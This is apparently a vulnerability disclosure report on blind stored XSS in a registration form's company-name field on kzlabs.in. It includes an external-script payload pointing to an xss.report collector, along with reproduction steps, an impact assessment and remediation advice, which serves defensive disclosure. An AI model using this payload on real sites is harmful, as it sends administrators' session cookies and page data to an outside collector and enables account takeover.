## Title

Blind Stored XSS in "Company Name" field — 63.php (registration)

## Affected URL

http://kzlabs.in/63.php?view=register

## Description

The "Company Name" input field on the registration form doesn't sanitize input before storing it. Payload '"><script src=https://xss.report/c/shivay></script> was submitted in this field during signup. The payload closes out the current attribute context and injects a live external script tag pointing to an xss.report collector. Since this field likely gets rendered later in an internal view (admin dashboard, user list, company directory, support panel, etc.) rather than immediately back to the registering user, it's being tracked as blind XSS pending a callback hit.

## Steps to Reproduce

1. Go to http://kzlabs.in/63.php?view=register and start account registration.
2. In the "Company Name" field, enter: '"><script src=https://xss.report/c/shivay></script>
3. Complete registration with remaining required fields.
4. Monitor the xss.report collector dashboard (/c/shivay) for an incoming callback.
5. A hit on the collector confirms the payload executed wherever the company name is later rendered (admin panel, backend view, etc.), along with captured cookies, DOM, and referring page URL.

## Proof of Concept




## Impact

Since this fires in an internal/admin context rather than the registering user's own session, impact is potentially high — if an admin or staff member views the company name in a backend dashboard, their session cookie, DOM, and privileges could be exposed to the attacker. This could lead to admin account takeover or broader internal panel compromise, depending on what view renders the field.

## Remediation

1. HTML-encode the company name value everywhere it's rendered, including internal/admin views — blind XSS often gets missed because internal pages aren't tested as thoroughly as public-facing ones.
2. Validate/restrict allowed characters at input (letters, numbers, spaces, basic punctuation only).
3. Add a CSP to restrict inline/external script execution as a backup layer, especially on admin-facing pages.
4. Set HttpOnly + Secure on session cookies used in admin/internal panels to limit damage if this fires there.
